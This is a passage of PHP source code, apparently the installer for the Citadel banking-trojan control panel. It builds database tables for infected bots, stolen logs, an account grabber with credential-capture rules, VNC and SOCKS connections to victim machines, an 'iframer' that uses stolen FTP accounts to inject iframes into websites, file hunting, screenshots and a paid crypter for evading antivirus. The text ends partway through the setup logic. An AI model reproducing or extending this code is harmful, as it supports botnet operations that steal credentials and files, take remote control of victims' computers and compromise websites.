<?php define('__INSTALL__', 1);
require_once('../system/global.php'); 

ini_set('display_errors', 1);
error_reporting(E_ALL);

define('CURRENT_MODULE', 'installer');

///////////////////////////////////////////////////////////////////////////////////////////////////
// Константы.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Файлы.
define('FILE_GEOBASE', 'geobase.txt');          //Геобаза
define('FILE_GEOBASE_NAMES', 'geobase.names.txt');    //Геобаза: СN,"China"
define('FILE_CONFIG',  '../system/config.php'); //Конфиг.

//Заголовок
define('APP_TITLE', 'Control Panel '.BO_CLIENT_VERSION.' Installer');

//Параметры диалога.
define('DIALOG_WIDTH',       '350px'); //Ширина диалога.
define('DIALOG_INPUT_WIDTH', '150px'); //Ширина <input>.

//Подключение темы.
define('THEME_PATH', '../theme');
require_once(THEME_PATH.'/index.php'); 

///////////////////////////////////////////////////////////////////////////////////////////////////
// Список таблиц.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Список ботов
$BOTIDLEN = BOT_ID_MAX_CHARS;
$BOTNETLEN = BOTNET_MAX_CHARS;

$_TABLES['botnet_list'] =
"`bot_id`         varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '' UNIQUE, ".            //ID бота.
"`botnet`         varchar(".BOTNET_MAX_CHARS.") NOT NULL default '".DEFAULT_BOTNET."', ". //Ботнет.
"`bot_version`    int unsigned      NOT NULL default '0', ".                              //Версия бота.

"`net_latency`    int unsigned      NOT NULL default '0', ".                              //Лаг соединения.
"`tcpport_s1`     smallint unsigned NOT NULL default '0', ".                              //TCP порт S1.

"`time_localbias` int signed        NOT NULL default '0', ".                              //Оффсет локального времени в секундах.
"`os_version`     tinyblob          NOT NULL, ".                                          //Данные об OS (dwMajor, dwMinor, dwBuild, dwSP, wSuiteMask, wProductType).
"`language_id`    smallint unsigned NOT NULL default '0', ".                              //ID языка OS.

"`ipv4_list`      blob              NOT NULL, ".                                          //Список IPv4 адресов.
"`ipv6_list`      blob              NOT NULL, ".                                          //Список IPv6 адресов.
"`ipv4`           varbinary(4)      NOT NULL default '\\0\\0\\0\\0', ".                   //IPv4
"`country`        varchar(2)        NOT NULL default '--', ".                             //Страна.

"`rtime_first`    int unsigned      NOT NULL default '0', ".                              //Время первого отчета об онлайне.
"`rtime_last`     int unsigned      NOT NULL default '0', ".                              //Время последнего отчета об онлайне.
"`rtime_online`   int unsigned      NOT NULL default '0', ".                              //Время, c которого бот находиться в онлайне.

"`flag_new`       bool              NOT NULL default '1', ".                              //Флаг "Инсталла".
"`flag_used`      bool              NOT NULL default '0', ".                              //Флаг "Использован".

"`comment`        tinytext          NOT NULL";                                            //Комментарии к боту.

//Шаблон отчетов.
$_TABLES['botnet_reports'] =
"`id`             int unsigned      NOT NULL auto_increment PRIMARY KEY, ".
"`bot_id`         varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '', ".                    //ID бота.
"`botnet`         varchar(".BOTNET_MAX_CHARS.") NOT NULL default '".DEFAULT_BOTNET."', ".  //Ботнет.
"`bot_version`    int unsigned      NOT NULL default '0', ".                               //Версия бота.

"`path_source`    text              NOT NULL, ".                                           //Исходный путь лога.
"`path_dest`      text              NOT NULL, ".                                           //Конечный путь лога.

"`time_system`    int unsigned      NOT NULL default '0', ".                               //Оффсет локального времени в секундах.
"`time_tick`      int unsigned      NOT NULL default '0', ".                               //Оффсет локального времени в мс.
"`time_localbias` int               NOT NULL default '0', ".                               //Оффсет локального времени в секундах.

"`os_version`     tinyblob          NOT NULL, ".                                           //Данные об OS (OSINFO).
"`language_id`    smallint unsigned NOT NULL default '0', ".                               //ID языка OS.

"`process_name`   text NOT NULL, ".                                                        //Имя процесса.
"`process_info`   text NOT NULL, ".                                                        //Информация о процессе.
"`process_user`   text NOT NULL, ".                                                        //Имя юзера процесса.

"`type`           int unsigned      NOT NULL default '0', ".                               //Тип лога.
"`context`        longtext          NOT NULL, ".                                           //Содержимое лога.

"`ipv4`           varbinary(15)     NOT NULL default '0.0.0.0', ".                         //IPv4
"`country`        varchar(2)        NOT NULL default '--', ".                              //Страна.
"`rtime`          int unsigned      NOT NULL default '0'".                               //Время отчета.
'';

//База IPv4 to Country.
$_TABLES['ipv4toc'] = <<<SQL
`l`			INT		UNSIGNED	NOT NULL	DEFAULT '0'	COMMENT 'low IP',
`h`			INT		UNSIGNED	NOT NULL	DEFAULT '0'	COMMENT 'high IP',
`c`			VARBINARY(2)		NOT NULL	DEFAULT '--'	COMMENT 'Country name 2letters',
`country`		VARCHAR(100)		NOT NULL	DEFAULT ''	COMMENT 'Country name full',

INDEX `idx_l_h` (`l`, `h`)
SQL;

//Список пользователей.
$_TABLES['cp_users'] = 
"`id`            int unsigned    NOT NULL auto_increment PRIMARY KEY, ".
"`name`          varchar(20)     NOT NULL default '' UNIQUE, ".           //Имя.
"`pass`          varchar(32)     NOT NULL default '', ".                  //Пароль.
"`language`      varbinary(2)    NOT NULL default 'en', ".                //Язык пользователя.
"`flag_enabled`  bool            NOT NULL default '1', ".                 //Флаг включенного пользователя
"`comment`       tinytext        NOT NULL, ".                             //Комментарии.

//Различные настройки.
"`ss_format`    varbinary(10)    NOT NULL default 'jpeg', ".              //Формат скриншотов.
"`ss_quality`   tinyint unsigned NOT NULL default '30', ".                //Качество скриншота.

//Права.
"`r_edit_bots`           bool NOT NULL default '1', ".

"`r_stats_main`          bool NOT NULL default '1', ".
"`r_stats_main_reset`    bool NOT NULL default '1', ".
"`r_stats_os`            bool NOT NULL default '1', ".

"`r_botnet_bots`         bool NOT NULL default '1', ".
"`r_botnet_scripts`      bool NOT NULL default '1', ".
"`r_botnet_scripts_edit` bool NOT NULL default '1', ".

"`r_reports_db`          bool NOT NULL default '1', ".
"`r_reports_db_edit`     bool NOT NULL default '1', ".
"`r_reports_files`       bool NOT NULL default '1', ".
"`r_reports_files_edit`  bool NOT NULL default '1', ".
"`r_reports_jn`          bool NOT NULL default '1', ".

"`r_reports_db_cmd`      bool NOT NULL default '1', ". // allow to view only CMD reports

"`r_svc_notes`           bool NOT NULL default '0', ".
"`r_svc_crypter_crypt`   bool NOT NULL default '0', ".
"`r_svc_crypter_pay`     bool NOT NULL default '0', ".

"`r_system_info`         bool NOT NULL default '1', ".
"`r_system_options`      bool NOT NULL default '1', ".
"`r_system_user`         bool NOT NULL default '1', ".
"`r_system_users`        bool NOT NULL default '1'";

//Скрипты ботам.
$_TABLES['botnet_scripts'] =
"`id`           int unsigned  NOT NULL auto_increment PRIMARY KEY,".
"`extern_id`    varbinary(16) NOT NULL default '0', ".                //Внешний ID.
"`name`         varchar(255)  NOT NULL default '', ".                 //Название группы.
"`flag_enabled` bool          NOT NULL default '0', ".                //Скрипт активна.
"`time_created` int unsigned  NOT NULL default '0', ".                //Время создания скрипта.
"`send_limit`   int unsigned  NOT NULL default '0', ".                //Лимит ботов.

"`bots_wl`      text          NOT NULL, ".                            //Список ботов, для которых нужно испольнять скрипт.
"`bots_bl`      text          NOT NULL, ".                            //Список ботов, для которых не нужно испольнять скрипт.
"`botnets_wl`   text          NOT NULL, ".                            //Список ботнетов, для которых нужно испольнять скрипт.
"`botnets_bl`   text          NOT NULL, ".                            //Список ботнетов, для которых не нужно испольнять скрипт.
"`countries_wl` text          NOT NULL, ".                            //Список стран, для которых нужно испольнить скрипт.
"`countries_bl` text          NOT NULL, ".                            //Список стран, для которых не нужно исполнять скрипт.

"`script_text`   text         NOT NULL, ".                            //Текстовое представление команд в группе.
"`script_bin`    blob         NOT NULL";                              //Бинарное представление команд в группе.

//Статистика скриптов по ботам.
$_TABLES['botnet_scripts_stat'] =
"`extern_id`   varbinary(16)                 NOT NULL, ".             //Внешний ID.
"`type`        tinyint unsigned              NOT NULL default '0', ". //Типа записи. 1 - отпралвен, 2 - исполнен, 3 - ошибка.
"`bot_id`      varchar(".BOT_ID_MAX_CHARS.") NOT NULL default '', ".  //ID бота.
"`bot_version` int unsigned                  NOT NULL default '0', ". //Версия бота.
"`rtime`       int unsigned                  NOT NULL default '0', ". //Время отчета.
"`report`      text                          NOT NULL, ".             //Текстовый отчет бота о выполнении сценария.
"UNIQUE `extern_id` (`extern_id`, `bot_id`, `type`)";       


//Статистика скриптов по ботам.
$_TABLES['botnet_software_stat'] = <<<SQL
`type`         INT            UNSIGNED       NOT NULL    COMMENT 'Software report type: apps avir firewall ...',
`vendor`       VARCHAR(100)                  NOT NULL    COMMENT 'Company name',
`product`      VARCHAR(100)                  NOT NULL    COMMENT 'Application name',
`count`        INT            UNSIGNED       NOT NULL    COMMENT 'Installed count (bots)',
UNIQUE `idx_type_vendor_product` (`type`, `vendor`, `product`),
INDEX `idx_count` (`count`)
SQL;

// Данные по обновлению exe-файлов и их проверке на вирусы
$_TABLES['exe_updates'] = <<<SQL
`id`			INT		UNSIGNED	NOT NULL	AUTO_INCREMENT PRIMARY KEY	COMMENT 'file_id',
`file`		VARCHAR(255)		NOT NULL	UNIQUE		COMMENT 'filename',
`hash`		VARCHAR(32)		NOT NULL				COMMENT 'file hash',
`ctime`		INT		UNSIGNED	NOT NULL				COMMENT 'first-seen time',
`mtime`		INT		UNSIGNED	NOT NULL				COMMENT 'update time',

`scan_date`	INT		UNSIGNED	NOT NULL	DEFAULT 0		COMMENT 'Avir scan date',
`scan_threat`	INT		UNSIGNED	NOT NULL	DEFAULT 0		COMMENT 'Threat-detected count',
`scan_count`	INT		UNSIGNED	NOT NULL	DEFAULT 0		COMMENT 'Avir software scanned',
`scan_details`	TEXT				NOT NULL	DEFAULT ''	COMMENT 'Scan details: name:value'
SQL;

$_TABLES['exe_updates_crypter'] = <<<SQL
`id`			INT		UNSIGNED	NOT NULL	AUTO_INCREMENT PRIMARY KEY	COMMENT 'upload_id',
`file_id`		INT		UNSIGNED	NOT NULL				COMMENT 'exe_updates(id)',
`hash`		CHAR(32)			NOT NULL				COMMENT 'Uploaded file hash',
`ctime`		INT		UNSIGNED	NOT NULL				COMMENT 'Upload timestamp',
`paid_date`	INT		UNSIGNED			DEFAULT NULL	COMMENT 'Timestamp when the crypt is paid or NULL',

INDEX `idx_fileid_ctime` (`file_id`,`ctime`),
UNIQUE `idx_fileid_hash` (`file_id`, `hash`)
SQL;

// Домены, найденные в логах
$_TABLES['botnet_rep_domains'] = <<<SQL
`id`			INT		UNSIGNED	NOT NULL	AUTO_INCREMENT	PRIMARY KEY	COMMENT 'domain id',
`domain`		VARCHAR(255)		NOT NULL				COMMENT '2-level or if expansion asked, 3-level domain name',
`domain2`		VARCHAR(255)		NOT NULL				COMMENT '2-level domain name (google.com)',
`domain3`		VARCHAR(255)		NOT NULL				COMMENT '3-level domain name (accounts.google.com)',
`mtime`		INT		UNSIGNED	NOT NULL				COMMENT 'Last found report timestamp',
`favorite`	TINYINT			NOT NULL				COMMENT 'Is favorite: 0 default >0 favorite <0 junk',
`expanded`	TINYINT			NOT NULL				COMMENT 'This domain was asked to expand: 3rd level chosen',

INDEX `idx_mtime_fav` (`mtime`,`favorite`),
INDEX `idx_domain` (`domain`)
SQL;

// Логи, найденные по доменам
$_TABLES['botnet_rep_domainlogs'] = <<<SQL
`domain_id`	INT		UNSIGNED	NOT NULL				COMMENT 'botnet_reports_domains.id',
`table`		INT		UNSIGNED	NOT NULL				COMMENT 'Botnet-Reports table timestamp (120131 as UNIX)',
`report_id`	INT		UNSIGNED	NOT NULL				COMMENT 'Report id in `table`',
`rtime`		INT		UNSIGNED	NOT NULL				COMMENT 'Report timestamp',
`urltype`		TINYINT			NOT NULL				COMMENT '0=http, 1=https',
`botId`		VARCHAR($BOTIDLEN)	NOT NULL				COMMENT 'BotId (partial for grouping)',

`checked`		TINYINT			NOT NULL				COMMENT 'Report has been checked by the master',

INDEX `idx_domainid` (`domain_id`),
INDEX `idx_rtime_checked_urltype` (`rtime`,`checked`,`urltype`),
INDEX `idx_botId` (`botId`),
INDEX `idx_table_reportId` (`table`,`report_id`)
SQL;

// Граббер аккаунтов
$_TABLES['accparse_rules'] = <<<SQL
`id`			INT		UNSIGNED	NOT NULL	AUTO_INCREMENT	PRIMARY KEY	COMMENT 'rule id',
`alias`		VARCHAR(255)		NOT NULL				COMMENT 'Rule alias name for reference',

`url`		VARCHAR(255)		NOT NULL				COMMENT 'URL mask to grab',
`params`		BLOB				NOT NULL				COMMENT 'Field masks array to grab: \\n-sep',


`enabled`		TINYINT			NOT NULL				COMMENT 'Whether the rule is enabled',
`notify`		TINYINT			NOT NULL				COMMENT 'Whether to notify on the jabber',
`autoconnect`	TINYINT			NOT NULL				COMMENT 'Auto-connect option: 1=VNC, 5=SOCKS',

INDEX `idx_enabled` (`enabled`)
SQL;

$_TABLES['accparse_accounts'] = <<<SQL
`id`			INT		UNSIGNED	NOT NULL	AUTO_INCREMENT	PRIMARY KEY	COMMENT 'grabbed account id',

`bot_id`		VARCHAR($BOTIDLEN)	NOT NULL				COMMENT 'Bot ID string',
`bot_info`	VARCHAR(255)		NOT NULL				COMMENT 'Bot info: OS, Browser, ..',

`rule_id`		INT		UNSIGNED	NOT NULL				COMMENT 'accparse_rules(id)',
`account`		BLOB				NOT NULL				COMMENT 'Grabbed account data',
`acc_hash`	VARCHAR(32)		NOT NULL				COMMENT 'Fields values hash for dupecheck',
`mtime`		INT		UNSIGNED	NOT NULL				COMMENT 'The last time this account was used',

`favorite`	TINYINT			NOT NULL	DEFAULT 0		COMMENT 'Is favorite: 0 default >0 favorite <0 junk',
`notes`		TEXT				NOT NULL	DEFAULT ''	COMMENT 'Custom notes',

UNIQUE `idx_ruleid_account` (`rule_id`, `acc_hash`),
INDEX  `idx_fav` (`favorite`),
INDEX `idx_botid` (`bot_id`)
SQL;

// VNC-плагин
$_TABLES['vnc_bot_connections'] = <<<SQL
`bot_id`		VARCHAR($BOTIDLEN)	NOT NULL	PRIMARY KEY	COMMENT 'Bot ID',

`protocol`	TINYINT			NOT NULL				COMMENT '1 VNC | 5 SOCKS',

`do_connect`	TINYINT			NOT NULL				COMMENT '0 no, 1 oneshot, -1 always, 2 & -2 force connect',
`ctime`		INT		UNSIGNED	NOT NULL	DEFAULT 0		COMMENT '0 | last connection time',
`my_port`	SMALLINT	UNSIGNED	NOT NULL				COMMENT 'Master port on the VNC server',
`bot_port`	SMALLINT	UNSIGNED	NOT NULL				COMMENT 'Bot port on the VNC server',

INDEX `idx_ctime_doconnect` (`ctime`, `do_connect`)
SQL;

// Дедупликация таблиц отчётов
$_TABLES['botnet_rep_dedup'] = <<<SQL
`table`		MEDIUMINT			NOT NULL				COMMENT 'Botnet-Reports table integer (120131)',
`report_id`	INT		UNSIGNED	NOT NULL				COMMENT 'Report id in `table`',
`hash`		BINARY(20)		NOT NULL				COMMENT 'Report fields sha1 raw hash',

UNIQUE `idx_table_reportid` (`table`, `report_id`),
INDEX `idx_hash` (`hash`)
SQL;

// Jabber-уведомления
$_TABLES['jabber_messages'] = <<<SQL
`id`            INT     UNSIGNED    NOT NULL    AUTO_INCREMENT  PRIMARY KEY     COMMENT 'message id',
`time`          INT     UNSIGNED    NOT NULL                                    COMMENT 'message timestamp',
`jid`           VARCHAR(255)        NOT NULL                                    COMMENT 'comma-sep JIDs that receive this messsage',
`msg`           TEXT                NOT NULL                                    COMMENT 'message contents',

`sent`          TINYINT             NOT NULL                                    COMMENT '0 pending | 1 send',
`sent_time`     INT     UNSIGNED                                                COMMENT 'sent time | null',

INDEX `idx_sent` (`sent`)
SQL;

// Ифреймер
$_TABLES['botnet_rep_iframer'] = <<<SQL
`id`            INT     UNSIGNED    NOT NULL    AUTO_INCREMENT,
`table`         MEDIUMINT           NOT NULL                COMMENT 'Botnet-Reports table integer (120131)',
`report_id`     INT     UNSIGNED    NOT NULL                COMMENT 'Report id in `table`',

`found_at`      INT     UNSIGNED    NOT NULL                COMMENT 'Timestamp when the account was discovered by the parser',
`ftp_acc`       VARCHAR(255)        NOT NULL                COMMENT 'FTP account connection string',

`posted_at`     INT     UNSIGNED                            COMMENT 'posted to iframer at: time | NULL',
`iframed_at`    INT     UNSIGNED                            COMMENT 'iframed at: time | NULL',
`is_valid`      TINYINT UNSIGNED                            COMMENT 'Is the account valid',

`s_page_count`  INT     UNSIGNED                            COMMENT 'Stat: iframed pages count',
`s_pages`       TEXT                                        COMMENT 'Stat: iframed page paths',
`s_stat`        TEXT                                        COMMENT 'Stat: detailed traversing stat',
`s_errors`      TEXT                                        COMMENT 'Stat: errors met while parsing this acc',

`ignore`        TINYINT             NOT NULL    DEFAULT 0   COMMENT '1 to ignore this account (never iframe)',

PRIMARY KEY(`id`),
INDEX `idx_table_reportid` (`table`, `report_id`),
UNIQUE `idx_ftpacc` (`ftp_acc`),
INDEX `idx_foundat` (`found_at`),
INDEX `idx_postedat` (`posted_at`),
INDEX `idx_iframedat` (`iframed_at`),
INDEX `idx_ignore` (`ignore`)
SQL;

// Поиск файлов
$_TABLES['botnet_rep_filehunter'] = <<<SQL
`id`            INT     UNSIGNED    NOT NULL    AUTO_INCREMENT  PRIMARY KEY,
`table`         MEDIUMINT           NOT NULL                        COMMENT 'Botnet-Reports table integer (120131)',
`report_id`     INT     UNSIGNED    NOT NULL                        COMMENT 'Report id in `table`',
`botnet`        VARCHAR($BOTNETLEN) NOT NULL                        COMMENT 'Botnet name',
`botId`         VARCHAR($BOTIDLEN)  NOT NULL                        COMMENT 'BotID with the file',
`rtime`         INT     UNSIGNED    NOT NULL                        COMMENT 'Report timestamp',

`upd`           INT     UNSIGNED    NOT NULL                        COMMENT 'This row update timestamp: on any click|event',

`f_path`        VARCHAR(255)        NOT NULL                        COMMENT 'File: path to it',
`f_size`        INT     UNSIGNED    NOT NULL                        COMMENT 'File: its size',
`f_hash`        CHAR(32)                        DEFAULT NULL        COMMENT 'File: its hash (if available)',
`f_mtime`       INT     UNSIGNED                DEFAULT NULL        COMMENT 'File: mtime',
`f_local`       VARCHAR(255)                    DEFAULT NULL        COMMENT 'File: path to locally-saved copy (if available)',

`state`         VARCHAR(30)         NOT NULL    DEFAULT 'log'       COMMENT 'File state: log job downloading downloaded uploading uploaded updated error rescan searching',
`job`           BLOB                            DEFAULT NULL        COMMENT 'Storage for any associated & pending job (if any)',
`favorite`      TINYINT             NOT NULL    DEFAULT 0           COMMENT '1 favorite | -1 hidden | 0 default',

`notes`         VARCHAR(255)        NOT NULL    DEFAULT ''          COMMENT 'Any custom notes',

INDEX `idx_table_reportid` (`table`, `report_id`),
INDEX `idx_botid` (`botId`),
INDEX `idx_upd` (`upd`),
INDEX `idx_job` (`job`(1))
SQL;

// Галерея скриншотов бота
$_TABLES['botnet_screenshots'] = <<<SQL
`id`            INT     UNSIGNED    NOT NULL    AUTO_INCREMENT      PRIMARY KEY,
`botId`         VARCHAR($BOTIDLEN)  NOT NULL                        COMMENT 'Bot ID',
`file`          VARCHAR(255)        NOT NULL                        COMMENT 'Screenshot file relative to reports_path',
`ftime`         INT     UNSIGNED    NOT NULL                        COMMENT 'Screenshot timestamp',
`group`         INT     UNSIGNED        NULL    DEFAULT NULL        COMMENT 'Screenshot series group',

UNIQUE `idx_file` (`file`),
INDEX `idx_botid` (`botId`),
INDEX `idx_ftime` (`ftime`),
INDEX `idx_group` (`group`)
SQL;

// Избранные отчёты
$_TABLES['botnet_rep_favorites'] = <<<SQL
`id`            INT     UNSIGNED    NOT NULL    AUTO_INCREMENT      PRIMARY KEY,
`table`         MEDIUMINT           NOT NULL                        COMMENT 'Botnet-Reports table integer (120131)',
`report_id`     INT     UNSIGNED    NOT NULL                        COMMENT 'Report id in `table`',

`botId`         VARCHAR($BOTIDLEN)  NOT NULL                        COMMENT 'Bot ID',
`rtime`         INT     UNSIGNED    NOT NULL                        COMMENT 'Report timestamp',
`path_source`   VARCHAR(255)        NOT NULL                        COMMENT 'Source path: URL or something',

`favtime`       INT     UNSIGNED    NOT NULL                        COMMENT 'Timestamp when added to favorites',
`comment`       TEXT                NOT NULL                        COMMENT 'Report notes',

`favorite`      TINYINT             NOT NULL    DEFAULT 0           COMMENT '1 favorite | -1 hidden | 0 default',

UNIQUE(`table`, `report_id`),
INDEX(`botId`),
INDEX(`favtime`),
INDEX(`favorite`)
SQL;

// История отстука по ботнету
$_TABLES['botnet_activity'] = <<<SQL
`botId`         VARCHAR($BOTIDLEN)  NOT NULL                        COMMENT 'Bot ID',
`date`          DATE                NOT NULL                        COMMENT 'The aggregation date',

`rtime_first`   INT     UNSIGNED    NOT NULL                        COMMENT 'First rtime this day',
`rtime_last`    INT     UNSIGNED    NOT NULL                        COMMENT 'Last  rtime this dat',

`c_scripts`     INT     UNSIGNED    NOT NULL                        COMMENT 'Received script reports count',
`c_reports`     INT     UNSIGNED    NOT NULL                        COMMENT 'Received reports count',
`c_presence`    INT     UNSIGNED    NOT NULL                        COMMENT 'Received presence count',

UNIQUE `idx_botid_date` (`botId`, `date`),
INDEX `idx_rtimes` (`rtime_first`,`rtime_last`)
SQL;



///////////////////////////////////////////////////////////////////////////////////////////////////
// Значения по умолчанию.
///////////////////////////////////////////////////////////////////////////////////////////////////

$pd_user            = 'admin';
$pd_pass            = '';

$pd_mysql_host      = 'localhost';
$pd_mysql_user      = 'citadelmysqllogin';
$pd_mysql_pass      = 'citadelmysqlpass';
$pd_mysql_db        = 'citadelmysqldb';

$pd_folder_name     = mt_rand();
$pd_reports_path    = '_reports'.mt_rand();
$pd_reports_to_db   = 1;
$pd_reports_to_fs   = 0;

$pd_botnet_timeout  = 25;
$pd_botnet_cryptkey = '';

$_OUTPUT = '';

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

//Отображение ошибки.
function ShowError($text)
{
  global $_OUTPUT;
  $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', '&#8226; ERROR:'.$text, THEME_DIALOG_ITEM_ERROR).THEME_DIALOG_ROW_END;
}

//Отображение процесса.
function ShowProgress($text)
{
  global $_OUTPUT;
	static $time = 0;
	$timediff = ($time == 0) ? 0 : (time() - $time);
	if ($time == 0)
		$time = time();
  
  $_OUTPUT .= THEME_DIALOG_ROW_BEGIN.str_replace('{TEXT}', '&#8226; ['.$timediff.'] - '.$text, THEME_DIALOG_ITEM_SUCCESSED).THEME_DIALOG_ROW_END;
}

//Создание таблицы.
function CreateTable($name)
{
  global $_TABLES;
  
  ShowProgress("Creating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");
  if(!@mysql_query("DROP TABLE IF EXISTS `{$name}`") || !@mysql_query("CREATE TABLE `{$name}` ({$_TABLES[$name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  return true;
}

//Обнавление таблицы.
function UpdateTable($name)
{
  global $_TABLES;
  
  ShowProgress("Updating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");  
  if(!@mysql_query("CREATE TABLE IF NOT EXISTS `{$name}` ({$_TABLES[$name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  //@mysql_query("ALTER TABLE `{$name}` CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE);
  
  //Обнавляем на удачу.
  $list = explode(',', $_TABLES[$name]);
  foreach($list as &$l)@mysql_query("ALTER TABLE `{$name}` ADD {$l}");

  return true;
}

//Обнавление таблицы по данным другой таблицы.
function UpdateTableEx($name, $real_name)
{
  global $_TABLES;
  
  ShowProgress(($real_name == 'botnet_reports'? '<small>' : '')."Updating table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.".");
  if(!@mysql_query("CREATE TABLE IF NOT EXISTS `{$name}` ({$_TABLES[$real_name]}) ENGINE=MyISAM CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE))
  {
    ShowError("Failed: ".htmlEntitiesEx(mysql_error()));
    return false;
  }
  
  //@mysql_query("ALTER TABLE `{$name}` CHARACTER SET=".MYSQL_CODEPAGE." COLLATE=".MYSQL_COLLATE);
  
  //Обнавляем на удачу.
  $list = explode(',', $_TABLES[$real_name]);
  foreach($list as &$l)@mysql_query("ALTER TABLE `{$name}` ADD {$l}");
  
  return true;
}

//Добавление строки в таблицу
function AddRowToTable($name, $query)
{
  if(!mysqlQueryEx($name, "INSERT INTO `{$name}` SET {$query}"))
  {
    ShowError("Failed to write row to table ".THEME_STRING_BOLD_BEGIN."'{$name}'".THEME_STRING_BOLD_END.": %s".htmlEntitiesEx(mysql_error()));
    return false;
  }
  return true;
}

//Создание пути.
function CreatePath($new_dir, $old_dir)
{
  $dir_r = '../'.$new_dir;
  
  if($old_dir != 0 && $old_dir != $new_dir && file_exists('../'.$old_dir))
  {
    ShowProgress("Renaming folder ".THEME_STRING_BOLD_BEGIN."'{$old_dir}'".THEME_STRING_BOLD_END." to ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
    if(!is_dir($dir_r) && !@rename('../'.$old_dir, $dir_r))
    {
      ShowError("Failed to rename folder.");
      return false;
    }
    
    @chmod($dir_r, 0777);
  }
  else
  {
    ShowProgress("Creating folder ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
    if(!is_dir($dir_r) && !@mkdir($dir_r, 0777))
    {
      ShowError("Failed to create folder ".THEME_STRING_BOLD_BEGIN."'{$new_dir}'".THEME_STRING_BOLD_END.".");
      return false;
    }
  }
  return true;
}

//Выбор режим работы.
$is_update = file_exists(FILE_CONFIG);

///////////////////////////////////////////////////////////////////////////////////////////////////
// Процесс утсановки/обнавления.
///////////////////////////////////////////////////////////////////////////////////////////////////
if(strcmp($_SERVER['REQUEST_METHOD'], 'POST') === 0)
{
  $error = false;
  $_OUTPUT = '<table class="table_frame" id="installer-results">'.
             str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, 'Installation steps:'), THEME_DIALOG_TITLE);
             
  set_time_limit(60*60);
  
  //Получение Пост-данных.
  if($is_update)
  {
    if(!@include_once(FILE_CONFIG))
    {
      ShowError("Failed to open file '".FILE_CONFIG."'.");
      $error = true;
    }
    else
    {
      if(isset($config['reports_path']))$pd_reports_path       = $config['reports_path'];
      if(isset($config['reports_to_db']))$pd_reports_to_db     = $config['reports_to_db'] ? 1 : 0;
      if(isset($config['reports_to_fs']))$pd_reports_to_fs     = $config['reports_to_fs'] ? 1 : 0;
      if(isset($config['botnet_timeout']))$pd_botnet_timeout   = (int)($config['botnet_timeout'] / 60);
      if(isset($config['botnet_cryptkey']))$pd_botnet_cryptkey = $config['botnet_cryptkey'];
      
      $pd_mysql_host = isset($config['mysql_host']) ? $config['mysql_host'] : NULL;
      $pd_mysql_user = isset($config['mysql_user']) ? $config['mysql_user'] : NULL;
      $pd_mysql_pass = isset($config['mysql_pass']) ? $config['mysql_pass'] : NULL;
      $pd_mysql_db   = isset($config['mysql_db'])   ? $config['mysql_db']   : NULL;
    }
  }
  else
  {
    $pd_user            = checkPostData('user',         1,  20);
    $pd_pass            = checkPostData('pass',         6,  64);  
    
    $pd_reports_path    = checkPostData('path_reports', 1, 256);
    $pd_reports_to_db   = (isset($_POST['reports_to_db']));// && $_POST['reports_to_db'] == 1);
    $pd_reports_to_fs   = (isset($_POST['reports_to_fs']));// && $_POST['reports_to_fs'] == 1);
    $pd_botnet_timeout  = checkPostData('botnet_timeout',  1,   4);
    $pd_botnet_cryptkey = checkPostData('botnet_cryptkey', 1, 256);

    $pd_mysql_host      = checkPostData('mysql_host',   1, 256);
    $pd_mysql_user      = checkPostData('mysql_user',   1, 256);
    $pd_mysql_pass      = checkPostData('mysql_pass',   0, 256);
    $pd_mysql_db        = checkPostData('mysql_db',     1, 256);
  }

  $pd_reports_path = trim(str_replace('\\', '/', trim($pd_reports_path)), '/');
  
  //Обработка ошибок.
  if(!$error)
  {
    if(!$is_update && ($pd_user === NULL || $pd_pass === NULL))
    {
      ShowError('Bad format of login data.');
      $error = true;
    }
    if($pd_mysql_host === NULL || $pd_mysql_user === NULL || $pd_mysql_db === NULL)
    {
      ShowError('Bad format of MySQL server data.');
      $error = true;
    }
    if($pd_reports_path === NULL)
    {
      ShowError('Bad format of reports path.');
      $error = true;
    }
    if(!is_numeric($pd_botnet_timeout) || $pd_botnet_timeout < 1)
    {
      ShowError('Bot online timeout have bad value.');
      $error = true;
    }
    if($pd_botnet_cryptkey === NULL)
    {
      ShowError('Bad format of encryption key.');
      $error = true;
    }
  }

  //Подключение к базе.
  if(!$error)
  {
    ShowProgress("Connecting to MySQL as ".THEME_STRING_BOLD_BEGIN."'{$pd_mysql_user}'".THEME_STRING_BOLD_END.".");
    if(!@mysql_connect($pd_mysql_host, $pd_mysql_user, $pd_mysql_pass) || !@mysql_query('SET NAMES \''.MYSQL_CODEPAGE.'\' COLLATE \''.MYSQL_COLLATE.'\''))
    {
      ShowError("Failed connect to MySQL server: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
  }

  //Выбор таблицы.
  if(!$error)
  {
    $db = addslashes($pd_mysql_db);
    ShowProgress("Selecting DB ".THEME_STRING_BOLD_BEGIN."'{$pd_mysql_db}'".THEME_STRING_BOLD_END.".");
    
    if(!@mysql_query("CREATE DATABASE IF NOT EXISTS `{$db}`"))
    {
      ShowError("Failed to create database: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
    else if(!@mysql_select_db($pd_mysql_db))
    {
      ShowError("Failed to select database: ".htmlEntitiesEx(mysql_error()));
      $error = true;
    }
    
